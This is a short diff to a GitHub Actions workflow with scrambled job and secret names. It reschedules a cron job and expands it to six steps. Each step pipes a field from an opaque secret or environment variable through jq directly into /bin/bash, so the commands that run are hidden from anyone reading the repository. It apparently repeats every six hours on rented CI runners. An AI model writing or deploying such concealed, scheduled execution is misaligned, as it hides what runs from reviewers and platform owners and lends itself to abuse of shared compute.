@@ -2,18 +2,20 @@ name: donglaopo7654
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 5/6 * * *'
+    - cron: '57 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: donglaopo7654
         env:
-          zg9076: ${{ secrets.zg9076 }}
+          atod6111: ${{ secrets.atod6111 }}
         run: |
-          echo $zg9076 | jq -r .x903 | /bin/bash
-          echo $exhe5049 | jq -r .efm226 | /bin/bash
-          echo $vxc1914 | jq -r .xob1719 | /bin/bash
+          echo $atod6111 | jq -r .x13 | /bin/bash
+          echo $aqqjm07006 | jq -r .dotn560 | /bin/bash
+          echo $k71 | jq -r .dxkhg31 | /bin/bash
+          echo $mpgms82 | jq -r .nldap546 | /bin/bash
+          echo $mp66297 | jq -r .hlzo44 | /bin/bash
+          echo $vviwq5 | jq -r .bzrgh71394 | /bin/bash
 
